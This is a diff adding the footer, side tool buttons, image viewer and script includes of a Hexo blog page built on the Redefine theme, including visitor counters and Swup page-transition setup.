+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
